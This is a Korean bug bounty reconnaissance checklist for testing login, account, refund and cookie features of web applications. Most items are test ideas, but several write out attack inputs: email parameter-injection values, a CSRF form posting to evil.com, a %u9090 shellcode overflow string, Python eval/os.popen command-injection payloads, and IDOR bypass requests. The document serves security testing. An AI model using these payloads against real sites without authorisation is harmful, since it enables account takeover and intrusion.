# 웹 취약점 진단 버그바운티 정찰단계 

## 로그인 페이지 진단

1. 로그인 페이지에서 웹 애플리케이션이 **Google OAuth** 를 사용하는지 확인
- OAuth 잘못된 구성 사용 
2. 로그인 페이지에서 웹 애플리케이션이 **Clickjacking** 에 취약한지 확인
- Login Page Clickjacking 으로 인한 계정탈취 
3. 로그인 페이지에서 **가짜 이메일이나 임시 이메일로 계정을** 생성 할 수있는지 확인
- Email 확인 로직 부족
4. 로그인 페이지에서 **동시 로그인** 가능한지 여부 확인
- 동시 로그인
5. **비밀번호 변경 시 이전 세션**이 만료되지 않는지 확인
- 비밀번호 재설정 세션결함
6. **비밀번호 변경 시 알림 메시지**가 발행되지 않는지 확인
- 비밀번호 변경 모범사례 
7. **비밀번호 변경 시 이전 비밀번호 재사용** 가능 여부 확인
- 비밀번호 변경 모범사례
8. **비밀번호 변경 시 현재 아이디와 동일한 비밀번호 사용** 가능 여부 확인
- 비밀번호 변경 모범사례
10. **이메일 변경 시 변경완료 확인 메시지**가 발행되지 않는지 확인 
- 비밀번호 변경 모범사례
11. **대쉬보드에서 비밀번호 변경 시** 이전 세션이 만료되지 않는지 확인
- 취약한 세션관리
12. 계정 가입 시 사용자 이름에 **하이퍼링크 주입** 가능 여부 확인 
- 하이퍼링크 주입
13. 비밀번호 변경 시 **빈 공간을 사용하여 비밀번호** 생성 가능여부 확인
- 비밀번호 변경 모범사례
14. **DMARC 레코드 정책 누락**으로 인해 이메일 스푸핑 가능여부 확인
- 이메일 스푸핑
15. 비밀번호 변경 기능을 통해 **속도제한** 이메일 스푸핑 여부 확인 
- 이메일 제공업체의 스팸 스푸핑
16. **계정 삭제 시 현재 비밀번호** 필요한 지 여부 확인
- 계정삭제
17. **대쉬보드에서 계정 비밀번호 변경 시 현재 비밀번호** 필요한 지 여부 확인
- 계정탈취
18. **대쉬보드에서 계정 이메일 변경 시 현재 비밀번호** 필요한 지 여부 확인 
- 계정탈취
19. **대쉬보드에서 비밀번호 변경 시** 중요 기능에 대한 속도제한 여부 확인
- 계정탈취
20. **대쉬보드에서 이메일 변경 시** 중요 기능에 대한 속도제한 여부 확인
- 계정탈취
21. **대쉬보드에서 계정 삭제 시** 중요 기능에 대한 속도제한 여부 확인
- 계정탈취 
22. **계정 삭제 시 알림 메시지** 누락 확인
- 비밀번호 모범사례
23. **2FA 설정 시** 현재 비밀번호 묻는지 여부 확인
- 부적절한 인증
24. **2FA 삭제 시** 현재 비밀번호 묻는지 여부 확인 
- 부적절한 인증
25. **로그인 페이지에서 계정잠금** 기능 악용가능 여부 확인
- 계정봉쇄 
26. **로그인 페이지에서** 속도제한 테스트
- 계정탈취
27. **계정 가입 시 HTTP** 로 계정 가입이 가능한지 확인
- 
28. **로그인 페이지에서 HTTP** 로 로그인 가능여부 확인
-
29. **비밀번호 재설정 링크 전송 시 이전 재설정 링크 만료** 여부 확인
-
30. **대쉬보드에서 비밀번호 변경 시 이전 재설정 링크** 만료되는지 여부 확인 
-
31. **비밀번호 재설정 링크를 통해 비밀번호 변경 시 재설정 링크가 만료되지 않는지** 여부 확인
-
32. **비밀번호 재설정 링크 전송 후 이메일 변경** 이후 이전 비밀번호 재설정 링크로 비밀번호 변경 가능여부 확인
-
33. 계정 비밀번호 변경 시 **이메일에 XSS코드 주입** 여부 확인
-
34. 계정 비밀번호 변경 시 공격자 이메일을 추가하여 **매개변수오염** 여부 확인
-
35. 계정 비밀번호 변경 시 OTP 코드를 추가하여 **코드주입** 여부 확인
-
36. 계정 비밀번호 변경 시 **호스트헤더** 주입여부 확인 
-
37. 계정 비밀번호 변경 시 **파라미터 값에 , %20 | %00 구분자 사용** 여부 확인
- email=victim@mail.com|hacker@mail.com
38. 계정 비밀번호 변경 시 **카본카피 사용** 여부 확인
- email=victim@mail.com%0a%0dcc:hacker@mail.com
39. 계정 설정에서 이메일 변경 요청을 캡처하고 CSRF로 공격자 이메일로 변경 캡처 전송
```
<html>
<body>
   <form action="https://evil.com/user/change-email" method="POST">
      <input type="hidden" value="victim@gmail.com"/>
      <input type="submit" value="Submit Request">
   </form>
</body>
</html>
```
40. 계정 아이디 변경 시 IDOR를 사용한 체이닝(chaining) 여부 확인
- userid=500&password=heked123 500은 공격자 ID, 501은 피해자 ID이므로 공격자 ID에서 피해자 ID로 userid를 변경합니다.
42. 2FA에 대한 속도제한 여부 확인
- 계정탈취
43. 대상 사이트에서 **수동으로 외부 링크 찾기(예: 소셜 미디어 계정에 대한 일부 링크 확인) 끊어진 링크** 확인
-
44. 웹 애플리케이션에서 해당 제품을 구매하지 않고 **Verified Reviewer로 리뷰를 게시**할 수 있는지 확인해 보십시오.
-
45. 파일 업로드 필드에서 ext를 허용하는지 확인
-
46. 쿠폰 코드가 재사용 가능한지 확인
-
47. 할인 품목에 포함되지 않는 제품에 할인 코드를 추가
-
48. 프리미엄 기능에 대한 비용을 지불하고 구독을 취소하십시오. 환불을 받았지만 기능이 여전히 사용 가능한 경우 금전적 영향 문제입니다.
-
49. 참-거짓 요청/응답 값을 사용하여 사용자가 프리미엄 기능에 액세스할 수 있는지 여부를 확인합니다.
50. 제품(일반적으로 일부 구독)을 구입하고 환불을 요청하여 해당 기능에 계속 액세스할 수 있는지 확인합니다.
51. 여러 번의 환불을 받을 수 있는지 확인하기 위해 구독 취소(경주 조건)를 여러 번 요청해 보세요.
52. 웹사이트에서 자바스크립트 코드를 보고 API키 / 토큰 찾기, 요청/응답 헤더를 확인하여 API키/토큰 찾기
53. 쿠키에 저장된 anf pii 또는 기타 민감한 정보가 있는지 확인하세요. 여기에는 일반적으로 이메일, 세션 ID, 생년월일 데이터, 모바일 주소, ssn 등이 포함됩니다.
54. 쿠키 길이 위반으로 인해 버퍼 오버플로가 발생합니다. 프로파일 길이보다 긴 쿠키 길이는 버퍼 오버플로 공격 시도를 나타낼 수 있습니다. 버퍼 오버플로 공격에서 공격자는 오버플로를 생성할 매우 긴 문자열을 보내야 하며, 이 문자열은 모두 이 위반을 생성합니다.
55. 계정 생성시 이메일 길이를 256자가 초과하는 것으로 계정을 생성합니다.
```
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531 b%u53ff%u0078%u0000%u00=a
```
56. 쿠키의 동일한 user_id 매개변수에 여러 사용자 ID를 주입
57. 공격자, vuctim 사용자 ID가 다음과 같은 rhe 쿠키에 또 다른 **user_id=** 매개변수 값을 추가합니다: **user_id=atacker&user_id=victim**
```
- 애플리케이션은 피해자 데이터의 데이터를 검색할 수 있습니다.
- 애플리케이션은 피해자 데이터와 공격자 데이터의 데이터를 검색할 수 있습니다
```
58. 쿠키를 제거하여 보호된 리소스에 액세스
59. 쿠키 매개변수 이름에 xss코드 삽입
60. 로그아웃 시 세션이 만료되지 않습니다. 뒤로가기 버튼으로 세션 재접속 
61. **[ ] OS 명령 주입**
```
**eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))**
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
**__import__('os').popen('COMMAND').read()**
```

62. **[ ] HTTP 메서드 변경**

```
GET /users/delete/victim_id  ->403
POST /users/delete/victim_id ->200
```

63. / [ ] 경로 횡단

```
POST /users/delete/victim_id          ->403
POST /users/delete/my_id/..victim_id  ->200
```

64. / [ ] 파일 형식 변경

```
GET /user_data/2341        -> 401
GET /user_data/2341.json   -> 200
GET /user_data/2341.xml    -> 200
GET /user_data/2341.config -> 200
GET /user_data/2341.txt    -> 200
```

65. / [ ] json 매개변수 오염

```
{"userid":1234,"userid":2542}
```

66. / [ ] 본문에서 배열로 ID를 감습니다.

```
{"userid":123} ->401
{"userid":[123]} ->200
```

67. / [ ] json 객체로 ID를 감습니다.

```
{"userid":123} ->401
{"userid":{"userid":123}} ->200
```

68. / [ ] outdata API 버전 테스트

```
GET /v3/users_data/1234 ->401
GET /v1/users_data/1234 ->200
```
67. http 에서 계정 가입 
68. 공격자가 사용자 이름 login.php로 가입할 수 있다면 로그인 페이지가 test.com/login.php 로 로그인 페이지가 탈취당함 














  ## 로그인 페이지 분석

  
